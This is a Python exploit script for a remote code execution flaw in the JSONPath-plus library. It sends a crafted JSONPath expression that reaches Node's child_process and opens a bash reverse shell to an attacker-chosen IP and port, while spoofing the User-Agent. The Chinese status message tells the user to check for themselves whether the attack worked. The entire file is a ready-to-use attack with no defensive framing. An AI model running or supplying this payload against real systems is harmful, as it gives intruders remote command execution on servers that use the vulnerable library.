import requests
from faker import Faker
import argparse

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

class JSONPathPlusExploit:
    def __init__(self, url: str, ip: str, port: int):
        self.url = url
        self.ip = ip
        self.port = port

    def send_request(self) -> None:
        fake = Faker()
        payload = (
            f"$..[?(p=\"console.log(this.process.mainModule.require('child_process')"
            f".execSync('bash -c \\\"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1\\\"')"
            f".toString())\";Ethan=''[['constructor']][['constructor']](p);Ethan())]"
        )
        headers = {
            'User-Agent': fake.user_agent(),
            'Content-Type': 'application/json',
            'Accept': '*/*'
        }
        try:
            requests.post(self.url, json={'path': payload}, headers=headers, timeout=10)
        except requests.exceptions.RequestException:
            pass
        print("[+] 利用请求已发送，请自行核实是否成功")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for JSONPath-plus RCE vulnerability")
    parser.add_argument("-u", "--url", required=True, help="Target URL for exploitation")
    parser.add_argument("-i", "--ip", required=True, help="Attacker's IP (LHOST) for reverse shell")
    parser.add_argument("-p", "--port", required=True, type=int, help="Attacker's Port (LPORT) for reverse shell")

    args = parser.parse_args()

    exploit = JSONPathPlusExploit(args.url, args.ip, args.port)
    exploit.send_request()
